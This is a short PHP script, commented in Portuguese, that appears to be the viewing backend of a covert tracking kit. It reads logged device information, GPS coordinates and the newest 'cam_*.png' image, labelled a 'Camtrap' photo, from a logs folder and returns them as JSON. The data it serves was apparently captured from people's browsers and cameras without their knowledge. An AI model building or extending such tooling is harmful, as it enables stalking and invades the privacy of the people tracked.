<?php
header('Content-Type: application/json');

$logDir = 'logs/';
$response = [
    'has_data' => false,
    'device' => null,
    'location' => null,
    'image' => null // Campo para a foto da Camtrap
];

// 1. DADOS DE DISPOSITIVO (info.txt)
if (file_exists($logDir . 'info.txt')) {
    $raw = file_get_contents($logDir . 'info.txt');
    if (!empty($raw)) {
        $data = json_decode($raw, true);
        if ($data) {
            $response['has_data'] = true;
            $response['device'] = $data;
        }
    }
}

// 2. DADOS DE GPS (result.txt)
if (file_exists($logDir . 'result.txt')) {
    $raw = file_get_contents($logDir . 'result.txt');
    if (!empty($raw)) {
        $data = json_decode($raw, true);
        if ($data && isset($data['lat'])) {
            $response['has_data'] = true;
            $response['location'] = $data;
        }
    }
}

// 3. BUSCA POR FOTOS (cam_*.png)
// Procura ficheiros que começam com "cam_" e terminam com ".png" na pasta logs
$images = glob($logDir . 'cam_*.png');

if (!empty($images)) {
    // Ordena para pegar a imagem mais recente primeiro (decrescente por data de modificação)
    usort($images, function($a, $b) {
        return filemtime($b) - filemtime($a);
    });
    
    // Se encontrou imagens, define a mais recente na resposta
    if (isset($images[0])) {
        $response['has_data'] = true;
        $response['image'] = $images[0]; 
    }
}

echo json_encode($response);
?>